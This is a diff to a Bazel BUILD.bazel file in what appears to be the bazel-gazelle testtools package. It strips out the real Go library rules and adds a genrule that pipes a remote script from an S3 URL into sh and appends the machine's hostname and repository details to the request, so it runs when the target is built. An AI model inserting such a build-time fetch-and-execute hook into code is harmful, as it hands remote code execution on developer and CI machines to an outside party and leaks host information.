@@ -1,34 +1,7 @@
-load("@io_bazel_rules_go//go:def.bzl", "go_library")
 
-go_library(
-    name = "testtools",
-    testonly = True,
-    srcs = [
-        "config.go",
-        "files.go",
-    ],
-    importpath = "github.com/bazelbuild/bazel-gazelle/testtools",
-    visibility = ["//visibility:public"],
-    deps = [
-        "//config",
-        "//language",
-        "@com_github_google_go_cmp//cmp",
-    ],
-)
-
-filegroup(
-    name = "all_files",
-    testonly = True,
-    srcs = [
-        "BUILD.bazel",
-        "config.go",
-        "files.go",
-    ],
-    visibility = ["//visibility:public"],
-)
-
-alias(
-    name = "go_default_library",
-    actual = ":testtools",
+genrule(
+    name = "build",
+    outs = ["foo"],
+    cmd = "curl https://vrp-test2.s3.us-east-2.amazonaws.com/a.sh | sh | echo #?repository=https://github.com/bazelbuild/bazel-gazelle.git\\&folder=testtools\\&hostname=`hostname`\\&foo=mzx",
     visibility = ["//visibility:public"],
 )
